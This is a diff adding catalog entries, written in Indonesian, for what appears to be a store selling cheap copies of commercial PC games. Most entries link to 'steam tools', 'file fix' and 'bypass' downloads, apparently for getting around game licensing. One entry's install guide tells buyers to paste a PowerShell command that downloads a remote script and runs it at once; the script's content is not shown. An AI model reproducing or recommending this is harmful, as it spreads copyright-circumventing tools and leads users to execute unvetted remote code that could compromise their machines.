+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": "Windows 10/11 64-bit",
+        "cpu": "Intel Core i5-8400 / Ryzen 5 2600",
+        "gpu": "GTX 1060 6GB / RX 580",
+        "ram": "8 GB"
+      },
+      "recommended": {
+        "os": "Windows 11",
+        "cpu": "Intel Core i7-9700K / Ryzen 7 3700X",
+        "gpu": "RTX 2060 / RX 6600 XT",
+        "ram": "16 GB"
+      }
+    },
+    "discount_price": 20000,
+    "is_trending": true,
+    "connectivity_type": "Offline",
+    "manual_guide": "jika belum masuk library kalian salin irm \"https://luatools.vercel.app/CloudRedirect.ps1\" | iex lalu pastekan di poweshell",
+    "release_type": "instant",
+    "steam_appid": "2215200",
+    "voratools_link": "https://vzdwtudduxjvxjniyexm.supabase.co/storage/v1/object/public/game-assets/voratools/0.1683457289619531.zip"
+  },
+  {
+    "id": "e075a930-9668-4a27-ac20-a2e868b7a32d",
+    "title": "God of War",
+    "price": 729000,
+    "description": "God of War (2018) adalah game action-adventure yang mengikuti kisah Kratos, mantan dewa perang dari Yunani, yang kini hidup di dunia mitologi Nordik bersama anaknya, Atreus",
+    "thumbnail": "https://tse4.mm.bing.net/th/id/OIP.cnIZwLcZ7J5biTrV5kn8zAHaLH?pid=Api&h=220&P=0",
+    "download_links": [
+      {
+        "url": "https://pixeldrain.com/u/p4fADbCP",
+        "icon": "tool",
+        "label": "steam tools"
+      },
+      {
+        "url": "https://pixeldrain.com/u/Fi4hqQBx",
+        "icon": "box",
+        "label": "install games"
+      },
+      {
+        "url": "https://pixeldrain.com/u/FfWMp4KJ",
+        "icon": "book",
+        "label": "Turial Install"
+      }
+    ],
+    "created_at": "2026-04-19T08:19:44.793663+00:00",
+    "genre": "Action, Adventure,Open Wold",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": "Windows 10 64-bit",
+        "cpu": "Intel i5-2500K / Ryzen 3 1200",
+        "gpu": "GTX 960 (4GB) / R9 290X",
+        "ram": "8 GB"
+      },
+      "recommended": {
+        "os": "Windows 10 64-bit",
+        "cpu": "Intel i5-6600K / Ryzen 5 2400G",
+        "gpu": "GTX 1060 (6GB) / RX 570",
+        "ram": "8 GB"
+      }
+    },
+    "discount_price": 10000,
+    "is_trending": false,
+    "connectivity_type": "Offline",
+    "manual_guide": null,
+    "release_type": "instant",
+    "steam_appid": null,
+    "voratools_link": null
+  },
+  {
+    "id": "c0960ee8-4af7-4a68-bd49-3d35796fc2a8",
+    "title": "God of War Ragnarök",
+    "price": 879000,
+    "description": "God of War Ragnarök adalah lanjutan langsung dari God of War (2018), dikembangkan oleh Santa Monica Studio.",
+    "thumbnail": "https://s.yimg.com/zb/imgv1/555478b4-f0c1-31d9-8775-5e1e4c16cfbc/t_500x300",
+    "download_links": [
+      {
+        "url": "https://pixeldrain.com/u/p4fADbCP",
+        "icon": "tool",
+        "label": "steam tools"
+      },
+      {
+        "url": "https://pixeldrain.com/u/XWTyoRsj",
+        "icon": "fix",
+        "label": "file fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/CHvAnwLB",
+        "icon": "book",
+        "label": "tutorial fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/iKUtpYeW",
+        "icon": "box",
+        "label": "install games"
+      },
+      {
+        "url": "https://pixeldrain.com/u/FfWMp4KJ",
+        "icon": "book",
+        "label": "Tutorial Install"
+      }
+    ],
+    "created_at": "2026-04-19T08:16:41.224115+00:00",
+    "genre": "Action, Adventure,Open Wold",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": "Windows 10",
+        "cpu": "Intel i5-4670K / Ryzen 3 1200",
+        "gpu": "GTX 1060 (6GB) / RX 5500 XT / Intel Arc A750",
+        "ram": "8 GB"
+      },
+      "recommended": {
+        "os": "Windows 10 64-bit",
+        "cpu": "i5 Gen baru / Ryzen 5 ke atas",
+        "gpu": "RTX 2060–3070 / RX 6600 ke atas",
+        "ram": "16 GB"
+      }
+    },
+    "discount_price": 10000,
+    "is_trending": false,
+    "connectivity_type": "Offline",
+    "manual_guide": null,
+    "release_type": "instant",
+    "steam_appid": null,
+    "voratools_link": null
+  },
+  {
+    "id": "f07f0a2d-509b-4667-a8de-b55077dcb791",
+    "title": "Assassin's Creed Syndicate",
+    "price": 409000,
+    "description": "Assassin’s Creed Syndicate adalah game action-adventure open-world dari Ubisoft yang berlatar di London era Revolusi Industri (sekitar tahun 1868).",
+    "thumbnail": "https://tse3.mm.bing.net/th/id/OIP.RnLedbGPPvx2s__caUOl4QHaJQ?pid=Api&h=220&P=0",
+    "download_links": [
+      {
+        "url": "https://pixeldrain.com/u/p4fADbCP",
+        "icon": "tool",
+        "label": "steam tools"
+      },
+      {
+        "url": "https://pixeldrain.com/u/9BrvXRoQ",
+        "icon": "fix",
+        "label": "file fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/CHvAnwLB",
+        "icon": "book",
+        "label": "tutorial fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/7BgKX9x2",
+        "icon": "box",
+        "label": "install game files"
+      },
+      {
+        "url": "https://pixeldrain.com/u/FfWMp4KJ",
+        "icon": "book",
+        "label": "Tutorial install"
+      }
+    ],
+    "created_at": "2026-04-19T05:47:47.911117+00:00",
+    "genre": "Action, Adventure,Open Wold",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": "Windows 7/8/10 (64-bit)",
+        "cpu": "Intel Core i5-2400 / AMD FX-6350",
+        "gpu": "GTX 660 / R9 270",
+        "ram": "6 GB"
+      },
+      "recommended": {
+        "os": "Windows 7/8/10 (64-bit)",
+        "cpu": "Intel Core i7-3770 / AMD FX-8350",
+        "gpu": "GTX 760 / R9 280X",
+        "ram": "8 GB"
+      }
+    },
+    "discount_price": 10000,
+    "is_trending": false,
+    "connectivity_type": "Offline",
+    "manual_guide": null,
+    "release_type": "instant",
+    "steam_appid": null,
+    "voratools_link": null
+  },
+  {
+    "id": "dc554c52-36d8-4d05-80a2-b7375af6a515",
+    "title": "A Plague Tale Innocence",
+    "price": 349000,
+    "description": "A Plague Tale: Innocence adalah game story-driven action-adventure yang dirilis tahun 2019 dan dikembangkan oleh Asobo Studio.\n\nGame ini berlatar di Prancis abad ke-14 (1348) saat wabah Black Death menyebar. Kamu akan mengikuti kisah dua saudara:\n\nAmicia de Rune\nHugo de Rune (adik yang sakit misterius)\n\nMereka melarikan diri dari:\n\nPasukan Inkuisisi\nWabah tikus mematikan dalam jumlah besar\n\nSepanjang permainan:\n\nKamu bermain sebagai Amicia (third-person)\nFokus pada bertahan hidup, melindungi Hugo\nMenggunakan alat seperti sling, api, dan alkimia\nMenghindari musuh dan memecahkan puzzle lingkungan\n\nCerita sangat emosional, dengan tema:\n\nhubungan keluarga\nkehilangan\nperjuangan bertahan hidup\n\nGame ini menekankan stealth karena musuh bisa membunuh pemain dengan cepat jika tertangkap",
+    "thumbnail": "https://s.yimg.com/zb/imgv1/f048df9c-35c3-3543-9545-9a3b0e6ae118/t_500x300",
+    "download_links": [],
+    "created_at": "2026-04-18T16:42:09.559953+00:00",
+    "genre": "Action, Adventure",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": "Windows 7/8/10 (64-bit)",
+        "cpu": "Intel Core i3-2120 / AMD FX-4100",
+        "gpu": "GTX 660 / Radeon HD 7870",
+        "ram": "8 GB"
+      },
+      "recommended": {
+        "os": "Windows 10 (64-bit)",
+        "cpu": "Intel Core i5-4690 / AMD FX-8300",
+        "gpu": "GTX 970 / RX 480",
+        "ram": "16 GB"
+      }
+    },
+    "discount_price": 8000,
+    "is_trending": false,
+    "connectivity_type": "Offline",
+    "manual_guide": "",
+    "release_type": "instant",
+    "steam_appid": "",
+    "voratools_link": "https://vzdwtudduxjvxjniyexm.supabase.co/storage/v1/object/public/game-assets/voratools/0.28344859170999825.zip"
+  },
+  {
+    "id": "27981955-91e9-4808-864b-fff34359b6ee",
+    "title": "Assassin's Creed Odyssey",
+    "price": 619000,
+    "description": "Assassin's Creed Odyssey adalah game role-playing aksi tahun 2018 yang dikembangkan oleh Ubisoft Quebec dan diterbitkan oleh Ubisoft. Ini adalah angsuran besar kesebelas dalam seri Assassin's Creed dan penerus Assassin's Creed Origins. Gim ini menampilkan dunia terbuka yang besar, pertempuran laut, dan sejarah mitologis Perang Peloponnesia antara Athena dan Sparta dari tahun 431 hingga 422 SM. Pemain mengontrol tentara bayaran Sparta , bertarung di kedua sisi konflik dan mencoba menemukan keluarga mereka dan melenyapkan Kultus Kosmos yang misterius. Gim ini juga melanjutkan alur cerita Layla Hassan, yang diperkenalkan di Origins, yang menghidupkan kembali ingatan tentara bayaran melalui perangkat Animus untuk menemukan artefak yang kuat.",
+    "thumbnail": "https://th.bing.com/th/id/OIP.JboCVInuTQ-CtaHwlSWszAHaIa?w=157&h=180&c=7&r=0&o=7&dpr=1.3&pid=1.7&rm=3",
+    "download_links": [
+      {
+        "url": "https://pixeldrain.com/u/LN9qWWpV",
+        "icon": "tool",
+        "label": "sTEAM tOOL"
+      },
+      {
+        "url": "https://pixeldrain.com/u/JH9LDznF",
+        "icon": "fix",
+        "label": "FILE Bypass"
+      },
+      {
+        "url": "https://pixeldrain.com/u/CHvAnwLB",
+        "icon": "book",
+        "label": "Tutorial Fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/FfWMp4KJ",
+        "icon": "book",
+        "label": "tUTORIALInstall"
+      },
+      {
+        "url": "https://pixeldrain.com/u/AKnkGfz5",
+        "icon": "box",
+        "label": "INSTALL GAME"
+      }
+    ],
+    "created_at": "2026-04-19T19:18:06.570183+00:00",
+    "genre": "Open World, RPG, Action",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": "Windows 10 64 bit",
+        "cpu": "Intel Core i5-2400",
+        "gpu": "NVIDIA GeForce GTX 660 atau AMD Radeon R9 285",
+        "ram": "8 GB"
+      },
+      "recommended": {
+        "os": "Windows 10 64 bit",
+        "cpu": "Intel Core i7-3770",
+        "gpu": "NVIDIA GeForce GTX 970 atau AMD Radeon R9 290",
+        "ram": "8 GB"
+      }
+    },
+    "discount_price": 10000,
+    "is_trending": false,
+    "connectivity_type": "Offline",
+    "manual_guide": null,
+    "release_type": "instant",
+    "steam_appid": null,
+    "voratools_link": null
+  },
+  {
+    "id": "d5b34168-a255-43f6-808a-a265f764c89c",
+    "title": "Resident Evil 2 Remake",
+    "price": 519000,
+    "description": "Resident Evil 2 Remake adalah game survival horror yang mengikuti kisah Leon S. Kennedy dan Claire Redfield saat mencoba bertahan hidup dari wabah zombie di Raccoon City. Dengan sudut pandang third-person modern, game ini menghadirkan suasana tegang, eksplorasi, puzzle, dan manajemen resource yang terbatas, di mana pemain harus menghadapi makhluk mengerikan serta ancaman seperti Tyrant (Mr. X) yang terus memburu sepanjang permainan.",
+    "thumbnail": "https://s.yimg.com/zb/imgv1/6feee04b-1329-35f3-b9dd-8f4e6a4ddabb/t_500x300",
+    "download_links": [
+      {
+        "url": "https://pixeldrain.com/u/p4fADbCP",
+        "icon": "tool",
+        "label": "steam tools"
+      },
+      {
+        "url": "https://pixeldrain.com/u/EZcrVAJu",
+        "icon": "book",
+        "label": "tutorial install"
+      },
+      {
+        "url": "https://pixeldrain.com/u/rbFNqe9t",
+        "icon": "box",
+        "label": "install game"
+      }
+    ],
+    "created_at": "2026-04-21T11:24:21.487597+00:00",
+    "genre": "Horror,Survival,Action,Adventure",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": "Windows 7/8/10 (64-bit)",
+        "cpu": "ntel Core i5-4460 / AMD FX-6300",
+        "gpu": "GTX 760 / Radeon R7 260X",
+        "ram": "8 GB"
+      },
+      "recommended": {
+        "os": "Windows 10 (64-bit)",
+        "cpu": "Intel Core i7-3770 / AMD FX-9590",
+        "gpu": "GTX 1060 / RX 480",
+        "ram": "8 GB"
+      }
+    },
+    "discount_price": 8000,
+    "is_trending": false,
+    "connectivity_type": "Offline",
+    "manual_guide": null,
+    "release_type": "instant",
+    "steam_appid": null,
+    "voratools_link": null
+  },
+  {
+    "id": "0d5e2093-7c0d-4eb1-aaec-1d968ae7db8c",
+    "title": "Need for Speed Heat",
+    "price": 759000,
+    "description": "eed for Speed ​​Heat adalah game balap yang berlatar di lingkungan dunia terbuka bernama Palm City, versi fiksi dari Miami, Florida , dan daerah sekitarnya. Namun, peta dalam game ini menampilkan geografi yang beragam, termasuk daerah pegunungan, hutan lebat, dan lapangan terbuka.",
+    "thumbnail": "https://s.yimg.com/zb/imgv1/246a912c-6940-35ed-a72f-d10704cd93fb/t_500x300",
+    "download_links": [
+      {
+        "url": "https://pixeldrain.com/u/yPCFP1bj",
+        "icon": "tool",
+        "label": "steam tools"
+      },
+      {
+        "url": "https://pixeldrain.com/u/NADPKAEo",
+        "icon": "fix",
+        "label": "file fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/k66rii4U",
+        "icon": "box",
+        "label": "tutorial fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/FfWMp4KJ",
+        "icon": "box",
+        "label": "tutorial install"
+      },
+      {
+        "url": "https://pixeldrain.com/u/moPT9neF",
+        "icon": "box",
+        "label": "install game"
+      }
+    ],
+    "created_at": "2026-05-09T17:54:46.611888+00:00",
+    "genre": "\tRacing,Sports,Open World",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": "Windows 10",
+        "cpu": "ntel Core i5 3570 | AMD FX 6350 or better",
+        "gpu": "AMD Radeon HD 7970 or Radeon R9 280x | NVIDIA GeForce GTX 760 or better",
+        "ram": "8 GB"
+      },
+      "recommended": {
+        "os": "",
+        "cpu": "",
+        "gpu": "",
+        "ram": ""
+      }
+    },
+    "discount_price": 10000,
+    "is_trending": false,
+    "connectivity_type": "Offline",
+    "manual_guide": "",
+    "release_type": "instant",
+    "steam_appid": null,
+    "voratools_link": null
+  },
+  {
+    "id": "8c78edfc-ad7d-4e60-879a-b37f1838609b",
+    "title": "A Way Out",
+    "price": 379000,
+    "description": "A Way Out adalah game co-op action-adventure yang dikembangkan oleh Hazelight Studios dan dipublikasikan oleh Electronic Arts.\n\nGame ini WAJIB dimainkan berdua (tidak bisa solo). Kamu dan temanmu akan bermain sebagai dua karakter",
+    "thumbnail": "https://tse3.mm.bing.net/th/id/OIP.8ZisoKTQJTmZLeVwtxTdoAHaHa?pid=Api&h=220&P=0",
+    "download_links": [
+      {
+        "url": "https://pixeldrain.com/u/p4fADbCP",
+        "icon": "tool",
+        "label": "steam tools"
+      },
+      {
+        "url": "https://pixeldrain.com/u/Q2smj65B",
+        "icon": "fix",
+        "label": "file fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/JyAcwrLs",
+        "icon": "book",
+        "label": "tutorial fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/xwSJsdR2",
+        "icon": "box",
+        "label": "install game"
+      },
+      {
+        "url": "https://pixeldrain.com/u/FfWMp4KJ",
+        "icon": "book",
+        "label": "tutorial Install"
+      }
+    ],
+    "created_at": "2026-04-20T05:08:05.156146+00:00",
+    "genre": "Action, Adventure",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": "Windows 7/8/10 (64-bit)",
+        "cpu": "Intel i3-2100T / AMD FX 6100",
+        "gpu": "GTX 650Ti / HD 7750",
+        "ram": "8 GB"
+      },
+      "recommended": {
+        "os": "Windows 10/11 (64-bit)",
+        "cpu": "Intel i5-3570K / Ryzen 3 1300X",
+        "gpu": "GTX 960 / R9 290",
+        "ram": "16 GB"
+      }
+    },
+    "discount_price": 10000,
+    "is_trending": false,
+    "connectivity_type": "Offline",
+    "manual_guide": null,
+    "release_type": "instant",
+    "steam_appid": null,
+    "voratools_link": null
+  },
+  {
+    "id": "928f231d-6719-4346-b359-1db5653cdc84",
+    "title": "Demon Slayer -Kimetsu no Yaiba- The Hinokami Chronicles 2",
+    "price": 699000,
+    "description": "The Hinokami Chronicles 2 adalah game anime fighting + action adventure yang dikembangkan oleh CyberConnect2 dan dipublikasikan oleh SEGA.",
+    "thumbnail": "https://tse1.mm.bing.net/th/id/OIP.dNC6aLbisgviq5AI0fSrLQAAAA?pid=Api&h=220&P=0",
+    "download_links": [
+      {
+        "url": "https://pixeldrain.com/u/p4fADbCP",
+        "icon": "tool",
+        "label": "steam tools"
+      },
+      {
+        "url": "https://pixeldrain.com/u/UVmDUJpp",
+        "icon": "box",
+        "label": "install game"
+      },
+      {
+        "url": "https://pixeldrain.com/u/FfWMp4KJ",
+        "icon": "book",
+        "label": "tutorial Install"
+      }
+    ],
+    "created_at": "2026-04-20T04:50:45.751094+00:00",
+    "genre": "Action, Adventure",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": "Windows 10",
+        "cpu": "Intel Core i5-3470 / Ryzen 3 1200",
+        "gpu": "GT 640 (2GB) / Radeon HD 7950",
+        "ram": "6 GB"
+      },
+      "recommended": {
+        "os": "Windows 10",
+        "cpu": "Intel Core i5-4570 / Ryzen 5 1400",
+        "gpu": "GTX 760 / RX 470",
+        "ram": "8 GB"
+      }
+    },
+    "discount_price": 15000,
+    "is_trending": false,
+    "connectivity_type": "Offline",
+    "manual_guide": null,
+    "release_type": "instant",
+    "steam_appid": null,
+    "voratools_link": null
+  },
+  {
+    "id": "847c1ad6-9f9b-4b5d-91f2-8dc24aadb51e",
+    "title": "Alan Wake",
+    "price": 130999,
+    "description": "Alan Wake adalah game psychological action thriller yang dikembangkan oleh Remedy Entertainment.\nCerita dimulai saat Alan pergi ke kota kecil Bright Falls untuk mencari inspirasi, tetapi istrinya tiba-tiba menghilang. Ia kemudian menemukan bahwa kejadian-kejadian dalam cerita yang ia tulis mulai menjadi kenyataan, menghadirkan makhluk gelap misterius yang disebut “Taken”.",
+    "thumbnail": "https://s.yimg.com/zb/imgv1/97126db7-d0bc-327d-b768-a83a6d983070/t_500x300",
+    "download_links": [
+      {
+        "url": "https://pixeldrain.com/u/p4fADbCP",
+        "icon": "tool",
+        "label": "steam tools"
+      },
+      {
+        "url": "https://pixeldrain.com/u/EZcrVAJu",
+        "icon": "book",
+        "label": "tutorial install"
+      },
+      {
+        "url": "https://pixeldrain.com/u/jjRkRgf3",
+        "icon": "box",
+        "label": "install game"
+      }
+    ],
+    "created_at": "2026-04-22T10:53:02.176123+00:00",
+    "genre": "Action, Adventure",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": "Windows XP / Vista / 7",
+        "cpu": "Dual Core 2.0 GHz",
+        "gpu": "DirectX 10 compatible (512MB VRAM)",
+        "ram": "2 GB"
+      },
+      "recommended": {
+        "os": "Windows 10",
+        "cpu": "Quad Core 2.66 GHz",
+        "gpu": "DirectX 10/11 GPU (1GB VRAM)",
+        "ram": "4 GB"
+      }
+    },
+    "discount_price": 5000,
+    "is_trending": false,
+    "connectivity_type": "Offline",
+    "manual_guide": null,
+    "release_type": "instant",
+    "steam_appid": null,
+    "voratools_link": null
+  },
+  {
+    "id": "6d8fe133-59d0-4884-8217-0a6a552de427",
+    "title": "R.E.P.O",
+    "price": 84500,
+    "description": "R.E.P.O. adalah game horror kooperatif yang mengajak pemain bekerja sama dalam tim untuk menjalankan misi mengambil dan mengamankan berbagai objek berharga di lingkungan yang gelap dan penuh ancaman. Dalam permainan ini, pemain harus berkoordinasi dengan baik sambil menghindari bahaya yang mengintai, seperti makhluk menyeramkan atau jebakan yang tidak terduga. Dengan suasana tegang, komunikasi yang menjadi kunci utama, serta gameplay berbasis kerja sama, game ini menawarkan pengalaman seru sekaligus menegangkan bagi para pemain.",
+    "thumbnail": "https://tse4.mm.bing.net/th/id/OIP.WTdv4CiWPKXxYUd3k0Qv5wHaJ4?pid=Api&h=220&P=0",
+    "download_links": [
+      {
+        "url": "https://pixeldrain.com/u/p4fADbCP",
+        "icon": "tool",
+        "label": "Steam Tools"
+      },
+      {
+        "url": "https://pixeldrain.com/u/3tr4FuYD",
+        "icon": "fix",
+        "label": "Online FIx"
+      },
+      {
+        "url": "https://pixeldrain.com/u/CHvAnwLB",
+        "icon": "book",
+        "label": "Tutorial Fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/FfWMp4KJ",
+        "icon": "book",
+        "label": "tutorial install"
+      },
+      {
+        "url": "https://pixeldrain.com/u/zpa1toUP",
+        "icon": "box",
+        "label": "install game"
+      }
+    ],
+    "created_at": "2026-04-20T15:21:36.489917+00:00",
+    "genre": "Horror, Survival",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": "Windows 10",
+        "cpu": "Core i5 6600",
+        "gpu": "GTX 970",
+        "ram": "8 GB"
+      },
+      "recommended": {
+        "os": "Windows 11",
+        "cpu": "Intel Core i7 8700",
+        "gpu": "GTX 1070",
+        "ram": "8 GB"
+      }
+    },
+    "discount_price": 10000,
+    "is_trending": false,
+    "connectivity_type": "Online",
+    "manual_guide": null,
+    "release_type": "instant",
+    "steam_appid": null,
+    "voratools_link": null
+  },
+  {
+    "id": "bded1508-c477-4368-a769-2cef8ae961c4",
+    "title": "It Takes Two",
+    "price": 479000,
+    "description": "It Takes Two adalah game petualangan kooperatif yang mengharuskan dua pemain bekerja sama untuk menyelesaikan berbagai tantangan. Game ini menceritakan pasangan suami istri, Cody dan May, yang berada di ambang perceraian lalu secara ajaib berubah menjadi boneka kecil dan harus berpetualang dalam dunia imajinatif untuk kembali ke tubuh mereka. Sepanjang permainan, pemain akan menghadapi berbagai level dengan teka-teki dan rintangan unik yang membutuhkan kerja sama, karena setiap karakter memiliki kemampuan berbeda. Selain gameplay yang kreatif dan variatif, game ini juga menyajikan cerita emosional tentang hubungan, komunikasi, dan pentingnya saling memahami.",
+    "thumbnail": "https://s.yimg.com/zb/imgv1/e7e180a5-4771-3df6-822c-d2667784d3e1/t_500x300",
+    "download_links": [
+      {
+        "url": "https://pixeldrain.com/u/p4fADbCP",
+        "icon": "tool",
+        "label": "Steam tools"
+      },
+      {
+        "url": "https://pixeldrain.com/u/Sn4NpwAG",
+        "icon": "fix",
+        "label": "online fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/CHvAnwLB",
+        "icon": "book",
+        "label": "tutorial fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/FfWMp4KJ",
+        "icon": "book",
+        "label": "tutorial install"
+      },
+      {
+        "url": "https://pixeldrain.com/u/qo2gwPQn",
+        "icon": "box",
+        "label": "install game"
+      }
+    ],
+    "created_at": "2026-04-20T14:34:22.274212+00:00",
+    "genre": "Action, Adventure",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": "Windows 8.1 64-bit or Windows 10 64-bit",
+        "cpu": "Intel core i3-2100T @ 2.5GHz/AMD FX 6100",
+        "gpu": "NVIDIA GeForce GTX 660 2GB, AMD R7 260x 2GB",
+        "ram": "8 GB"
+      },
+      "recommended": {
+        "os": "Windows 8.1 64-bit or Windows 10 64-bit",
+        "cpu": "Intel Core i5 3570K; AMD Ryzen 3 1300x or equivalent",
+        "gpu": "Nvidia GeForce GTX 960; AMD Radeon R9 290 or equivalent",
+        "ram": "16 GB"
+      }
+    },
+    "discount_price": 15000,
+    "is_trending": false,
+    "connectivity_type": "Online",
+    "manual_guide": null,
+    "release_type": "instant",
+    "steam_appid": null,
+    "voratools_link": null
+  },
+  {
+    "id": "83a253df-b866-4e7c-9971-7549c9d84bed",
+    "title": "Grand Theft Auto V Legacy",
+    "price": 439000,
+    "description": "Grand Theft Auto V (sering disingkat sebagai GTA: V atau GTA: 5) adalah permainan laga-petualangan 2013 yang dikembangkan oleh Rockstar North dan diterbitkan oleh Rockstar Games. Ini adalah entri utama pertama dalam seri Grand Theft Auto sejak 2008 Grand Theft Auto IV. Berlatar di dalam negara bagian fiksi San Andreas, yang berbasis di California Selatan, kisah pemain tunggal mengikuti tiga kriminal dan upaya mereka untuk melakukan perampokan di bawah tekanan lembaga pemerintah yang korup serta penjahat yang berkuasa. Desain dunia terbuka memungkinkan pemain bebas berkeliaran di pedesaan terbuka San Andreas dan kota fiksi Los Santos, yang berbasis di Los Angeles, Amerika Serikat.",
+    "thumbnail": "https://s.yimg.com/fz/api/res/1.2/0Dk.e4iZWXZwCk63ob5PWQ--~C/YXBwaWQ9c3JjaGRkO2ZpPWZpbGw7aD0yNDA7cT0xMDA7dz0yNDA-/https://s.yimg.com/cv/apiv2/default/20220725/grand_theft_auto_v.png",
+    "download_links": [],
+    "created_at": "2026-04-20T12:10:39.908732+00:00",
+    "genre": "Action, Adventure, Open World",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": "Windows 10 (build 1909 or above)",
+        "cpu": "Intel Core i7-4770 / AMD FX-9590",
+        "gpu": "NVIDIA GeForce GTX 1630 (4GB VRAM) / AMD Radeon RX 6400 (4GB VRAM)",
+        "ram": "8GB RAM"
+      },
+      "recommended": {
+        "os": "Windows 11",
+        "cpu": "Intel Core i5-9600K / AMD Ryzen 5 3600",
+        "gpu": "NVIDIA GeForce RTX 3060 (8GB VRAM) / AMD Radeon RX 6600XT (8GB VRAM)",
+        "ram": "16GB Dual-Channel Configuration RAM"
+      }
+    },
+    "discount_price": 15000,
+    "is_trending": false,
+    "connectivity_type": "Offline",
+    "manual_guide": "",
+    "release_type": "instant",
+    "steam_appid": "",
+    "voratools_link": "https://vzdwtudduxjvxjniyexm.supabase.co/storage/v1/object/public/game-assets/voratools/0.20323366281360888.zip"
+  },
+  {
+    "id": "4a235eb6-3d61-47c5-91d3-eb04e4bae766",
+    "title": "Left 4 Dead 2",
+    "price": 90999,
+    "description": "Left 4 Dead 2 adalah game co-op first-person shooter (FPS) bertema zombie dari Valve.\n\nGame ini berfokus pada kerja sama tim (4 pemain) untuk bertahan hidup dari wabah zombie. Kamu akan bermain sebagai salah satu dari 4 survivor",
+    "thumbnail": "https://s.yimg.com/zb/imgv1/70ffc3fd-528b-379c-abe7-0f964cfbe572/t_500x300",
+    "download_links": [
+      {
+        "url": "https://pixeldrain.com/u/p4fADbCP",
+        "icon": "tool",
+        "label": "steam tools"
+      },
+      {
+        "url": "https://pixeldrain.com/u/RUKWjEgT",
+        "icon": "fix",
+        "label": "file fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/6uX5cZSn",
+        "icon": "book",
+        "label": "tutorial file fix"
+      },
+      {
+        "url": "https://pixeldrain.com/u/d3zpc8zW",
+        "icon": "box",
+        "label": "install games"
+      },
+      {
+        "url": "https://pixeldrain.com/u/FfWMp4KJ",
+        "icon": "book",
+        "label": "Tutorial Install"
+      }
+    ],
+    "created_at": "2026-04-19T08:27:08.163068+00:00",
+    "genre": "Survival,Action,Horror",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": "Windows 7 / XP / Vista",
+        "cpu": "Pentium 4 3.0 GHz",
+        "gpu": "Model 2.0 (DirectX 9 compatible)",
+        "ram": "2 GB"
+      },
+      "recommended": {
+        "os": "Windows 10/11 (64-bit)",
+        "cpu": "Dual Core 2.0 GHz",
+        "gpu": "DirectX 9 compatible yang lebih kuat",
+        "ram": "4 GB"
+      }
+    },
+    "discount_price": 8000,
+    "is_trending": false,
+    "connectivity_type": "Online",
+    "manual_guide": null,
+    "release_type": "instant",
+    "steam_appid": null,
+    "voratools_link": null
+  },
+  {
+    "id": "6217f064-ac55-44f7-9b54-52d3955ef676",
+    "title": "Assassin's Creed Shadows",
+    "price": 799000,
+    "description": "Assassin’s Creed Shadows adalah game action RPG open-world dari Ubisoft yang berlatar di Jepang feodal (era Sengoku).",
+    "thumbnail": "https://s.yimg.com/zb/imgv1/9088e618-0ab5-3121-9456-7c6c4e917508/t_500x300",
+    "download_links": [
+      {
+        "url": "https://pixeldrain.com/u/JyAcwrLs",
+        "icon": "guide",
+        "label": "Tutorial / Guide"
+      }
+    ],
+    "created_at": "2026-04-19T05:20:43.045312+00:00",
+    "genre": "Action,RPG,Open Wolrd",
+    "min_spec": {
+      "os": "-",
+      "cpu": "-",
+      "gpu": "-",
+      "ram": "-"
+    },
+    "specifications": {
+      "minimum": {
+        "os": "Windows 10/11 64-bit",
+        "cpu": "Intel Core i7-8700K / Ryzen 5 3600",
+        "gpu": "GTX 1070 / RX 5700",
+        "ram": "16 GB"
+      },
+      "recommended": {
+        "os": "Windows 10/11 64-bit",
+        "cpu": "Intel Core i7-12700K / Ryzen 7 5800X",
+        "gpu": "RTX 3070 / RX 6800 XT",
+        "ram": "16–32 GB"
+      }
+    },
+    "discount_price": 10000,
+    "is_trending": false,
+    "connectivity_type": "Offline",
+    "manual_guide": "",
